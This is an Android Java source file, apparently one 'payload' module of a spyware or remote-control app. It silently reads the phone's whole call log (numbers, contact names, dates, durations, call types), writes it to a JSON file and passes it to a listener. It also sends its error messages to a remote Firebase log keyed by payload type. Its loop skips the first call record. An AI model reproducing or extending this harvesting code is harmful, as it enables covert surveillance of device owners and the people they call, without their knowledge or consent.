package com.aigs.serviceone.payload;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.util.Log;

import com.aigs.serviceone.helpers.CallExtractorNotifier;
import com.aigs.serviceone.helpers.FileSystem;
import com.aigs.serviceone.helpers.PayloadTypes;
import com.aigs.serviceone.helpers.SmsModes;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.lang.ref.WeakReference;
import java.util.Date;

public class CallLogsPayload extends AsyncTask<String, Integer, String> {

    private WeakReference<Context> contextRef;
    private CallExtractorNotifier callExtractorNotifier;

    public CallLogsPayload(Context context) {
        contextRef = new WeakReference<>(context);
    }

    public CallLogsPayload setCallLogsListener(CallExtractorNotifier callLogsListener) {
        this.callExtractorNotifier = callLogsListener;
        return this;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(@SmsModes String... strings) {
        try {

            Context context = contextRef.get();
            Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            int cached_name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

            try {
                if (managedCursor.moveToFirst()) {
                    JSONArray jsonArray = new JSONArray();
                    while (managedCursor.moveToNext()) {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("NUMBER", managedCursor.getString(number));
                        jsonObject.put("CALL_DATE", new Date(Long.valueOf(managedCursor.getString(date))));
                        jsonObject.put("DURATION", managedCursor.getString(duration));
                        jsonObject.put("NAME", managedCursor.getString(cached_name));

                        String callType = managedCursor.getString(type);


                        int dircode = Integer.parseInt(callType);
                        switch (dircode) {
                            case CallLog.Calls.OUTGOING_TYPE:
                                jsonObject.put("CALL_TYPE", "OUTGOING");
                                break;

                            case CallLog.Calls.INCOMING_TYPE:
                                jsonObject.put("CALL_TYPE", "INCOMING");
                                break;

                            case CallLog.Calls.MISSED_TYPE:
                                jsonObject.put("CALL_TYPE", "MISSED");
                                break;
                        }
                        jsonArray.put(jsonObject);
                    }

                    File file = FileSystem.createInstance(context).writeCallData(jsonArray.toString());
                    callExtractorNotifier.onCallRetrieved(file, jsonArray.toString());

                } else {
                    callExtractorNotifier.onResponseEmpty();
                }


            } catch (Exception e) {

            }

            managedCursor.close();
        }catch (Exception e){
            Log.e("EXCEPTION_CL",e.getMessage());
            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_CALL_LOGS+"").child("CurrentLog").setValue(e.getMessage());

        }

        return null;
    }

    @Override
    protected void onPostExecute(String string) {
        super.onPostExecute(string);
    }
}
